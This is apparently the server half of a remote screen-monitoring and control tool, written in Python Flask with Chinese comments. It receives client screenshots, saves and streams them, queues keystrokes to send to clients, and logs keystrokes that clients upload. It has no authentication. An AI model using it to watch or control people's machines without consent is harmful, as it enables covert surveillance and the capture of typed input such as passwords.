from flask import Flask, request, jsonify, Response
import time
import threading
import logging
import io
import os
from PIL import Image
from datetime import datetime

# 关闭所有垃圾日志
logging.getLogger('werkzeug').setLevel(logging.ERROR)
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
    handlers=[
        logging.FileHandler("server.log", encoding="utf-8"),
        logging.StreamHandler()
    ]
)
logger = logging.info

app = Flask(__name__)

CLIENTS = {}
LOCK = threading.Lock()
TIMEOUT = 1.0
SAVE_DIR = "client_screens"
os.makedirs(SAVE_DIR, exist_ok=True)

# 超时检测
def check_timeout():
    while True:
        now = time.time()
        with LOCK:
            offline = [cid for cid, v in CLIENTS.items() if now - v["last_hb"] > TIMEOUT]
            for cid in offline:
                logger(f"客户端 {cid} 已断开")
                del CLIENTS[cid]
        time.sleep(0.1)

# 心跳
@app.route("/heartbeat", methods=["POST"])
def heartbeat():
    cid = request.json["client_id"]
    now = time.time()
    with LOCK:
        if cid not in CLIENTS:
            logger(f"客户端 {cid} 已上线")
            os.makedirs(f"{SAVE_DIR}/{cid}", exist_ok=True)
            CLIENTS[cid] = {"last_hb": now, "screen": None, "cmds": []}
        CLIENTS[cid]["last_hb"] = now
    return jsonify(status="ok")

# 上传屏幕 + 保存图片
@app.route("/upload/screen", methods=["POST"])
def upload_screen():
    cid = request.form.get("client_id")
    if not cid or cid not in CLIENTS:
        return jsonify(status="ok")

    img = Image.open(io.BytesIO(request.files['screen'].read()))
    ts = datetime.now().strftime("%Y%m%d_%H%M%S_%f")[:-3]
    img.save(f"{SAVE_DIR}/{cid}/{ts}.jpg", "JPEG", quality=40)

    with LOCK:
        CLIENTS[cid]["screen"] = img
    return jsonify(status="ok")

# 实时画面
@app.route("/live/<cid>")
def live(cid):
    def gen():
        while True:
            try:
                img = CLIENTS[cid]["screen"]
                if not img:
                    time.sleep(0.01)
                    continue
                buf = io.BytesIO()
                img.save(buf, "JPEG", quality=40)
                yield b'--frame\r\nContent-Type: image/jpeg\r\n\r\n' + buf.getvalue() + b'\r\n'
            except:
                time.sleep(0.01)
    return Response(gen(), mimetype="multipart/x-mixed-replace; boundary=frame")

# 发送按键
@app.route("/send_key", methods=["POST"])
def send_key():
    d = request.json
    with LOCK:
        if d["client_id"] in CLIENTS:
            CLIENTS[d["client_id"]]["cmds"].append(d["key"])
    return jsonify(status="ok")

# 获取指令（修复无报错）
@app.route("/get_cmds", methods=["POST"])
def get_cmds():
    cid = request.json.get("client_id", "")
    with LOCK:
        if cid not in CLIENTS:
            return jsonify(cmds=[])
        cmds = CLIENTS[cid]["cmds"].copy()
        CLIENTS[cid]["cmds"].clear()
    return jsonify(cmds=cmds)

# 按键上传
@app.route("/upload/key", methods=["POST"])
def upload_key():
    d = request.json
    logger(f"[{d['client_id']}] 输入: {d['key']}")
    return jsonify(status="ok")

if __name__ == "__main__":
    logger("服务启动 | 画面保存到 client_screens/")
    logger("实时画面: http://127.0.0.1:5800/live/客户端ID")
    threading.Thread(target=check_timeout, daemon=True).start()
    app.run(host="0.0.0.0", port=5800, threaded=True)